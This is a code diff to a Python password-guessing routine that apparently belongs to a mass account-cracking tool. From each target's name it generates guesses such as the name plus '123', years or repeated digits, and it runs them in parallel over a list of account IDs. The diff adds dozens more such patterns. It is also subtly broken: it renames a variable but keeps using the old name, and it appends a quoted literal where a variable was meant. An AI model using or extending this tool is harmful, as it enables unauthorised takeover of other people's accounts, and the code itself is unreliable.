@@ -449,10 +449,10 @@ def passwrd():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
+			las = nmf.split(' ')[0]
 			pwv = []
 			if len(nmf)<6:
-				if len(frs)<3:
+				if len(las)<3:
 					pass
 				else:
 					pwv.append(frs+'123')
@@ -486,8 +486,43 @@ def passwrd():
 					pwv.append(frs+'555')
 					pwv.append(frs+'333')
 					pwv.append(frs+'999')
+					pwv.append(las+'123')
+					pwv.append(las+'1234')
+					pwv.append(las+'12345')
+					pwv.append(las+'123456')
+					pwv.append(las+'2020')
+					pwv.append(las+'2021')
+					pwv.append(las+'2022')
+					pwv.append(las+'0001')
+					pwv.append(las+'0002')
+					pwv.append(las+'0003')
+					pwv.append(las+'0004')
+					pwv.append(las+'0005')
+					pwv.append(las+'0006')
+					pwv.append(las+'0007')
+					pwv.append(las+'0008')
+					pwv.append(las+'0009')
+					pwv.append(las+'00')
+					pwv.append(las+'1122')
+					pwv.append(las+'7890')
+					pwv.append(las+'789')
+					pwv.append(las+'678')
+					pwv.append(las+'444')
+					pwv.append(las+'888')
+					pwv.append(las+'666')
+					pwv.append(las+'222')
+					pwv.append(las+'111')
+					pwv.append(las+'000')
+					pwv.append(las+'777')
+					pwv.append(las+'555')
+					pwv.append(las+'333')
+					pwv.append(las+'999')
+					pwv.append(frs+'las')
+					pwv.append(frs+las+'123')
+					pwv.append(frs+las+'1234')
+					pwv.append(frs+las+'12345')
 			else:
-				if len(frs)<3:
+				if len(las)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
@@ -522,7 +557,41 @@ def passwrd():
 					pwv.append(frs+'555')
 					pwv.append(frs+'333')
 					pwv.append(frs+'999')
-					
+					pwv.append(las+'123')
+					pwv.append(las+'1234')
+					pwv.append(las+'12345')
+					pwv.append(las+'123456')
+					pwv.append(las+'2020')
+					pwv.append(las+'2021')
+					pwv.append(las+'2022')
+					pwv.append(las+'0001')
+					pwv.append(las+'0002')
+					pwv.append(las+'0003')
+					pwv.append(las+'0004')
+					pwv.append(las+'0005')
+					pwv.append(las+'0006')
+					pwv.append(las+'0007')
+					pwv.append(las+'0008')
+					pwv.append(las+'0009')
+					pwv.append(las+'00')
+					pwv.append(las+'1122')
+					pwv.append(las+'7890')
+					pwv.append(las+'789')
+					pwv.append(las+'678')
+					pwv.append(las+'444')
+					pwv.append(las+'888')
+					pwv.append(las+'666')
+					pwv.append(las+'222')
+					pwv.append(las+'111')
+					pwv.append(las+'000')
+					pwv.append(las+'777')
+					pwv.append(las+'555')
+					pwv.append(las+'333')
+					pwv.append(las+'999')
+					pwv.append(frs+'las')
+					pwv.append(frs+las+'123')
+					pwv.append(frs+las+'1234')
+					pwv.append(frs+las+'12345')
 					
 					
 			if 'ya' in pwpluss:
